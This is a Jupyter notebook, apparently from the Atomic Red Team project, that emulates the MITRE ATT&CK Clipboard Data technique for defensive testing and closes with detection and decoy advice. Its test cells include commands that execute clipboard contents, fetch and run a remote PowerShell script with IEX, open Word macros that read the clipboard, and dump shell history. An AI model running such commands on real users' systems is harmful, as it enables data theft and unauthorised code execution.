{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "39ba7f28",
   "metadata": {},
   "source": "# T1115 - Clipboard Data\nAdversaries may collect data stored in the clipboard from users copying information within or between applications. \n\nFor example, on Windows adversaries can access clipboard data by using <code>clip.exe</code> or <code>Get-Clipboard</code>.(Citation: MSDN Clipboard)(Citation: clip_win_server)(Citation: CISA_AA21_200B) Additionally, adversaries may monitor then replace users\u2019 clipboard with their data (e.g., [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002)).(Citation: mining_ruby_reversinglabs)\n\nmacOS and Linux also have commands, such as <code>pbpaste</code>, to grab clipboard contents.(Citation: Operating with EmPyre)"
  },
  {
   "cell_type": "markdown",
   "id": "59ee31a2",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "d78e3e55",
   "metadata": {},
   "source": [
    "### Atomic Test #1 - Utilize Clipboard to store or execute commands from",
    "Add data to clipboard to copy off or execute commands from.\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\ndir | clip\necho \"T1115\" > %temp%\\T1115.txt\nclip < %temp%\\T1115.txt\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "bda49308",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1115 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "073b0803",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\ndel %temp%\\T1115.txt >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e44acb67",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1115 -TestNumbers 1 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "1f1dfd7c",
   "metadata": {},
   "source": [
    "### Atomic Test #2 - Execute Commands from Clipboard using PowerShell",
    "Utilize PowerShell to echo a command to clipboard and execute it\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\necho Get-Process | clip\nGet-Clipboard | iex\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "959bb594",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1115 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "1a8e4f95",
   "metadata": {},
   "source": [
    "### Atomic Test #3 - Execute commands from clipboard",
    "Echo a command to clipboard and execute it",
    "**Supported Platforms:** macos",
    "#### Attack Commands: Run with `bash`\n",
    "```bash\necho ifconfig | pbcopy\n$(pbpaste)```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3119470e",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1115 -TestNumbers 3"
  },
  {
   "cell_type": "markdown",
   "id": "5c158c9b",
   "metadata": {},
   "source": "### Atomic Test #4 - Collect Clipboard Data via VBA\nThis module copies the data stored in the user's clipboard and writes it to a file, $env:TEMP\\atomic_T1115_clipboard_data.txt\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: Microsoft #{ms_product} must be installed\n\n##### Check Prereq Commands:\n```powershell\ntry {\n  New-Object -COMObject \"Word.Application\" | Out-Null\n  $process = \"Word\"; if ( $process -eq \"Word\") {$process = \"winword\"}\n  Stop-Process -Name $process\n  exit 0\n} catch { exit 1 }\n\n```\n##### Get Prereq Commands:\n```powershell\nWrite-Host \"You will need to install Microsoft Word manually to meet this requirement\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7e2fbed0",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1115 -TestNumbers 4 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "ae0d8d1d",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nSet-Clipboard -value \"Atomic T1115 Test, grab data from clipboard via VBA\"\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\nInvoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1115\\src\\T1115-macrocode.txt\" -officeProduct \"Word\" -sub \"GetClipboard\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "8fc2e4eb",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1115 -TestNumbers 4"
  },
  {
   "cell_type": "markdown",
   "id": "cd849af3",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nRemove-Item \"$env:TEMP\\atomic_T1115_clipboard_data.txt\" -ErrorAction Ignore\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "965cdc68",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1115 -TestNumbers 4 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "e339720b",
   "metadata": {},
   "source": [
    "### Atomic Test #5 - Add or copy content to clipboard with xClip",
    "Utilize Linux Xclip to copy history and place in clipboard then output to a history.txt file. Successful execution will capture history and output to a file on disk.\n",
    "**Supported Platforms:** linux",
    "#### Attack Commands: Run with `sh`\n",
    "```sh\napt install xclip -y\nhistory | tail -n 30 | xclip -sel clip\nxclip -o > history.txt\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2f6191a5",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1115 -TestNumbers 5"
  },
  {
   "cell_type": "markdown",
   "id": "6d85c1c7",
   "metadata": {},
   "source": "## Detection\nAccess to the clipboard is a legitimate function of many applications on an operating system. If an organization chooses to monitor for this behavior, then the data will likely need to be correlated against other suspicious or non-user-driven activity."
  },
  {
   "cell_type": "markdown",
   "id": "cc76a04a",
   "metadata": {},
   "source": "\n## Shield Active Defense\n### Decoy Content  \n Seed content that can be used to lead an adversary in a specific direction, entice a behavior, etc. \n\n Decoy Content is the data used to tell a story to an adversary. This content can be legitimate or synthetic data which is used to reinforce or validate your defensive strategy. Examples of decoy content are files on a storage object, entries in the system registry, system shortcuts, etc.\n#### Opportunity\nThere is an opportunity to introduce data to an adversary to influence their future behaviors.\n#### Use Case\nA defender can insert into a system's clipboard decoy content for the adversary to find. \n#### Procedures\nCreate directories and files with names and contents using key words that may be relevant to an adversary to see if they examine or exfiltrate the data.\nSeed a file system with content that is of no value to the company but reinforces the legitimacy of the system if viewed by an adversary.\n"
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "pwsh",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "pwsh",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}